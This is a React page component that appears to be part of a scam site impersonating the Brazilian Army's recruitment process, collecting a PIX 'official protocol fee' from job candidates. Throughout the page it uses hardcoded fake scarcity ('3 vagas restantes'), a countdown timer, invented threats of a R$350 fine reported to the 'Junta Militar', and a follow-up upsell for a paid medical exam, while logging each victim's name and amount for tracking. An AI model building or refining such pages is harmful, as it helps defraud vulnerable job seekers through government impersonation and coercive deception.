import { useState, useEffect } from 'react';
import { useRoute, useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Copy, CheckCircle, AlertTriangle, Clock, Building, Users, FileCheck, ArrowRight, Shield, MapPin } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';

interface RemarketingData {
  transactionId: string;
  candidateName: string;
  candidateEmail: string;
  candidatePhone: string;
  amount: string;
  pixCode: string;
  qrCode: string;
  vagaTitle: string;
  vagaCompany: string;
  vagaLocation: string;
  localProvaName: string;
  localProvaAddress: string;
  dataProva: string;
  horaProva: string;
  status: string;
  createdAt: string;
}

export default function RemarketingPage() {
  const [, params] = useRoute('/remarketing/:transaction_id');
  const [data, setData] = useState<RemarketingData | null>(null);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(600); // 30 minutos em segundos
  const [, setLocation] = useLocation();
  const { trackEvent, trackPixCodeCopy } = useClarityEvents();

  useEffect(() => {
    if (params?.transaction_id) {
      fetchRemarketingData(params.transaction_id);
    }
  }, [params?.transaction_id]);

  useEffect(() => {
    // Timer countdown
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Verificação automática de pagamento a cada segundo
  useEffect(() => {
    if (!params?.transaction_id || paymentConfirmed) return;

    const checkPaymentStatus = async () => {
      try {
        const response = await fetch(`/api/verificar-status-pagamento/${params.transaction_id}`);
        const result = await response.json();
        console.log('Status do pagamento:', result.status)
        if (result.status === 'PAID' || result.status === 'APPROVED' || result.status !== "PENDING") {
          setPaymentConfirmed(true);
          setLocation(`/login-pos-pagamento?protocol_id=${params.transaction_id}`);
        }
      } catch (error) {
        console.log('Erro ao verificar status do pagamento:', error);
      }
    };

    const paymentChecker = setInterval(checkPaymentStatus, 1000);

    return () => clearInterval(paymentChecker);
  }, [params?.transaction_id, paymentConfirmed, setLocation]);

  const fetchRemarketingData = async (transactionId: string) => {
    try {
      setLoading(true);
      const response = await fetch(`/api/remarketing/${transactionId}`);
      const result = await response.json();

      if (result.success) {
        if (result.paymentConfirmed) {
          setPaymentConfirmed(true);
          setData(result.data);
        } else {
          setData(result.data);
          
          // Track remarketing page access
          trackEvent('remarketing_page_accessed', {
            transaction_id: transactionId,
            candidate_name: result.data.candidateName,
            amount: result.data.amount,
            timestamp: new Date().toISOString()
          });
        }
      } else {
        setError(result.error || 'Erro ao carregar dados da transação');
      }
    } catch (err) {
      setError('Erro de conexão. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };


  
  
  const copyPixCode = async () => {
    if (data?.pixCode) {
      try {
        await navigator.clipboard.writeText(data.pixCode);
        setCopied(true);
        
        // Track PIX code copy
        trackEvent('pix_code_copied', {
          page: 'remarketing_page',
          transaction_id: data.transactionId,
          amount: data.amount,
          timestamp: new Date().toISOString()
        });
        
        setTimeout(() => setCopied(false), 3000);
      } catch (err) {
        console.error('Erro ao copiar código PIX:', err);
      }
    }
  };

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const formatCurrency = (amount: string) => {
    const numAmount = parseFloat(amount);
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(numAmount);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
        <ExercitoHeader />
        <main className="max-w-2xl mx-auto px-6 py-16">
          <div className="text-center">
            <div className="w-16 h-16 border-4 border-gray-200 border-t-green-600 rounded-full animate-spin mx-auto mb-8"></div>
            <h1 className="text-2xl font-semibold text-gray-900 mb-4">
              Carregando dados do pagamento
            </h1>
            <p className="text-gray-600">
              Aguarde enquanto recuperamos as informações da sua inscrição...
            </p>
          </div>
        </main>
        <ExercitoFooter />
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
        <ExercitoHeader />
        <main className="max-w-2xl mx-auto px-6 py-16">
          <div className="text-center">
            <AlertTriangle className="w-16 h-16 text-red-500 mx-auto mb-8" />
            <h1 className="text-2xl font-semibold text-gray-900 mb-4">
              Erro ao carregar pagamento
            </h1>
            <p className="text-gray-600 mb-8">
              {error}
            </p>
            <Button onClick={() => window.location.href = '/'} className="bg-green-700 hover:bg-green-800">
              Voltar ao início
            </Button>
          </div>
        </main>
        <ExercitoFooter />
      </div>
    );
  }

  if (paymentConfirmed && data) {
    return (
      <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
        <ExercitoHeader />
        <main className="max-w-2xl mx-auto px-6 py-16">
          <div className="text-center">
            <CheckCircle className="w-20 h-20 text-green-600 mx-auto mb-8" />
            <h1 className="text-3xl font-bold text-gray-900 mb-4">
              Pagamento Confirmado!
            </h1>
            <p className="text-lg text-gray-700 mb-8">
              Olá, <strong>{data.candidateName}</strong>! Seu pagamento foi processado com sucesso.
            </p>
            
            <Card className="mb-8">
              <CardContent className="p-6">
                <div className="space-y-4">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Transação:</span>
                    <span className="font-semibold">{data.transactionId}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Valor:</span>
                    <span className="font-semibold text-green-600">{formatCurrency(data.amount)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Vaga:</span>
                    <span className="font-semibold">{data.vagaTitle}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Local da Prova:</span>
                    <span className="font-semibold">{data.localProvaName}</span>
                  </div>
                </div>
              </CardContent>
            </Card>

            <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-8">
              <h3 className="font-semibold text-green-800 mb-2">Próximos Passos</h3>
              <ul className="text-green-700 text-left space-y-2">
                <li>• Agendar Exame Médico de Competência Mínima</li>
                <li>• Preparar documentação necessária</li>
                <li>• Aguardar confirmação da prova de seleção</li>
                <li>• Acompanhar comunicações oficiais</li>
              </ul>
            </div>
            
            <div className="text-center">
              <button
                onClick={() => window.location.href = '/login-pos-pagamento'}
                className="inline-flex items-center px-8 py-4 text-lg font-medium text-white rounded-lg transition-colors duration-200"
                style={{ backgroundColor: '#6A7D00' }}
                onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#5a6b00'}
                onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#6A7D00'}
              >
                Agendar Exame Médico
                <ArrowRight className="w-5 h-5 ml-2" />
              </button>
              <p className="text-sm text-gray-600 mt-3">
                Próxima etapa obrigatória: Exame médico básico (R$ 147,24)
              </p>
            </div>
          </div>
        </main>
        <ExercitoFooter />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="flex-1 container mx-auto max-w-4xl px-4 py-6">
        {/* Clean Urgency Alert */}
        <div className="mb-8">
          <div className="p-4 bg-amber-50 border border-amber-200 rounded-lg">
            <div className="flex items-center">
              <AlertTriangle className="w-5 h-5 text-amber-600 mr-3" />
              <div className="flex-1">
                <p className="text-amber-900 font-medium text-sm">
                  Disponibilidade limitada: 3 vagas restantes em {data?.vagaLocation}
                </p>
                <div className="flex items-center mt-1">
                  <Clock className="w-4 h-4 text-amber-700 mr-1" />
                  <p className="text-amber-800 text-sm">
                    Reserva válida por <span className="font-semibold">{formatTime(timeLeft)}</span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Header */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            {data?.candidateName ? `${data.candidateName.split(' ')[0].charAt(0).toUpperCase() + data.candidateName.split(' ')[0].slice(1).toLowerCase()}, efetue o pagamento da Taxa do Protocolo Oficial` : 'Taxa do Protocolo Oficial de Seleção'}
          </h1>
          <div className="text-3xl font-bold text-[#556B2F] mb-1">
            {data?.amount && formatCurrency(data.amount)}
          </div>
          <p className="text-sm text-gray-600">
            Prova agendada para {data?.dataProva} as {data?.horaProva}
          </p>
        </div>

        <div className="grid lg:grid-cols-2 gap-8">
          {/* PIX Payment Section */}
          <Card className="border-0 shadow-sm">
            <CardContent className="p-6">
              <h2 className="text-lg font-medium text-gray-900 mb-6">Como pagar</h2>
              
              {/* Payment Tutorial */}
              <div className="mb-6">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex flex-col items-center">
                    <div className="w-10 h-10 rounded-full flex items-center justify-center bg-[#556B2F] text-white">
                      <Shield className="w-5 h-5" />
                    </div>
                    <span className="text-xs mt-2 text-center text-[#556B2F] font-medium">
                      Abra seu banco
                    </span>
                  </div>
                  <div className="flex flex-col items-center">
                    <div className="w-10 h-10 rounded-full flex items-center justify-center bg-[#556B2F] text-white">
                      <Copy className="w-5 h-5" />
                    </div>
                    <span className="text-xs mt-2 text-center text-[#556B2F] font-medium">
                      Copie o código
                    </span>
                  </div>
                  <div className="flex flex-col items-center">
                    <div className="w-10 h-10 rounded-full flex items-center justify-center bg-[#556B2F] text-white">
                      <ArrowRight className="w-5 h-5" />
                    </div>
                    <span className="text-xs mt-2 text-center text-[#556B2F] font-medium">
                      Cole e pague
                    </span>
                  </div>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-1 mb-4">
                  <div className="bg-[#556B2F] h-1 rounded-full w-full"></div>
                </div>
              </div>

              {/* QR Code */}
              <div className="bg-white rounded-lg border p-4 mb-4">
                {data?.pixCode ? (
                  <img 
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(data.pixCode)}`} 
                    alt="QR Code PIX" 
                    className="w-40 h-40 mx-auto object-contain" 
                    onError={(e) => {
                      e.currentTarget.style.display = 'none';
                      e.currentTarget.nextElementSibling?.classList.remove('hidden');
                    }}
                  />
                ) : (
                  <div className="w-40 h-40 mx-auto bg-gray-100 rounded-lg flex items-center justify-center">
                    <p className="text-gray-500 text-sm text-center">
                      Carregando QR Code...
                    </p>
                  </div>
                )}
                <div className="hidden w-40 h-40 mx-auto bg-gray-100 rounded-lg flex items-center justify-center">
                  <p className="text-gray-500 text-sm text-center">
                    QR Code indisponível
                  </p>
                </div>
              </div>

              {/* PIX Code Copy */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-700">Código PIX:</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={data?.pixCode || ''}
                    readOnly
                    className="flex-1 px-3 py-2 text-xs border border-gray-300 rounded-lg bg-gray-50 font-mono"
                  />
                  <Button
                    onClick={copyPixCode}
                    className={`px-4 transition-all duration-300 ${
                      copied 
                        ? 'bg-green-600 hover:bg-green-700 scale-105' 
                        : 'bg-[#556B2F] hover:bg-[#414A2E]'
                    }`}
                  >
                    {copied ? (
                      <CheckCircle className="w-4 h-4" />
                    ) : (
                      <Copy className="w-4 h-4" />
                    )}
                  </Button>
                </div>
                {copied && (
                  <div className="flex items-center gap-2 text-green-600 text-sm animate-pulse">
                    <CheckCircle className="w-4 h-4" />
                    Código copiado com sucesso!
                  </div>
                )}
              </div>

              {/* Security Information */}
              <div className="mt-4 pt-3 border-t border-gray-100">
                <div className="flex items-center gap-2 text-gray-600">
                  <Shield className="w-4 h-4" />
                  <span className="text-xs">
                    Segurança garantida através do <strong>Banco Central</strong> • Dados protegidos
                  </span>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Job and Exam Information */}
          <Card className="border-0 shadow-sm">
            <CardContent className="p-6">
              <h2 className="text-lg font-medium text-gray-900 mb-6">Informações da vaga</h2>
              
              <div className="space-y-4">
                <div className="flex items-start gap-3">
                  <Building className="w-5 h-5 text-gray-500 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">{data?.vagaTitle}</p>
                    <p className="text-sm text-gray-600">{data?.vagaCompany}</p>
                    <p className="text-sm text-gray-600">{data?.vagaLocation}</p>
                  </div>
                </div>
                
                <div className="flex items-start gap-3">
                  <MapPin className="w-5 h-5 text-gray-500 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">Local da prova</p>
                    <p className="text-sm text-gray-600">{data?.localProvaName}</p>
                    <p className="text-sm text-gray-600">{data?.localProvaAddress}</p>
                  </div>
                </div>
                
                <div className="flex items-start gap-3">
                  <Clock className="w-5 h-5 text-gray-500 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">Data da prova</p>
                    <p className="text-sm text-gray-600">{data?.dataProva}</p>
                  </div>
                </div>
              </div>

              {/* Important Notes */}
              <div className="mt-6 pt-4 border-t border-gray-100">
                <div className="space-y-3">
                  <div className="flex items-start gap-3">
                    <CheckCircle className="w-4 h-4 text-green-600 mt-0.5" />
                    <p className="text-sm text-gray-700">
                      Confirmação automática após pagamento
                    </p>
                  </div>
                  <div className="flex items-start gap-3">
                    <Clock className="w-4 h-4 text-amber-600 mt-0.5" />
                    <p className="text-sm text-gray-700">
                      Código válido por {formatTime(timeLeft)}
                    </p>
                  </div>
                  <div className="flex items-start gap-3">
                    <AlertTriangle className="w-4 h-4 text-amber-600 mt-0.5" />
                    <p className="text-sm text-gray-700">
                      Multa de R$ 350,00 por desistência após notificação
                    </p>
                  </div>
                  <div className="flex items-start gap-3">
                    <FileCheck className="w-4 h-4 text-blue-600 mt-0.5" />
                    <p className="text-sm text-gray-700">
                      Comprovante enviado por e-mail
                    </p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
        
        {/* FAQ Section - Clean Design */}
        <Card className="mt-8 border-0 shadow-sm">
          <CardContent className="p-6">
            <h3 className="text-lg font-medium text-gray-900 mb-4">Perguntas frequentes</h3>
            <div className="space-y-4">
              <div>
                <p className="text-sm font-medium text-gray-900 mb-1">
                  Quanto tempo demora para confirmar o pagamento?
                </p>
                <p className="text-sm text-gray-600">
                  O pagamento é confirmado automaticamente em até 2 minutos após ser processado pelo seu banco.
                </p>
              </div>

              <div>
                <p className="text-sm font-medium text-gray-900 mb-1">
                  O que acontece se não efetuar o pagamento?
                </p>
                <p className="text-sm text-gray-600">
                  Multa de R$ 350,00 será aplicada conforme notificação já enviada à Junta Militar, além da perda definitiva da vaga.
                </p>
              </div>

              <div>
                <p className="text-sm font-medium text-gray-900 mb-1">
                  Quando minha reserva expira?
                </p>
                <p className="text-sm text-gray-600">
                  Sua reserva expira em {formatTime(timeLeft)}. Após isso, a vaga será liberada para o próximo candidato.
                </p>
              </div>

              <div>
                <p className="text-sm font-medium text-gray-900 mb-1">
                  Posso remarcar a prova depois de pagar?
                </p>
                <p className="text-sm text-gray-600">
                  Não é possível remarcar. A data e local são definitivos conforme cronograma da Junta Militar.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Summary Information */}
        <Card className="mt-6 border-l-4 border-amber-400 bg-amber-50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-amber-900">
                  Protocolo: {data?.transactionId.slice(0,6).toUpperCase()}
                </p>
                <p className="text-sm text-amber-800">
                  Valor: {data?.amount && formatCurrency(data.amount)} • Expira em {formatTime(timeLeft)}
                </p>
              </div>
              <div className="text-right">
                <p className="text-xs text-amber-700">3 vagas restantes</p>
                <p className="text-xs text-amber-700">em {data?.vagaLocation}</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>

      <ExercitoFooter />
    </div>
  );
}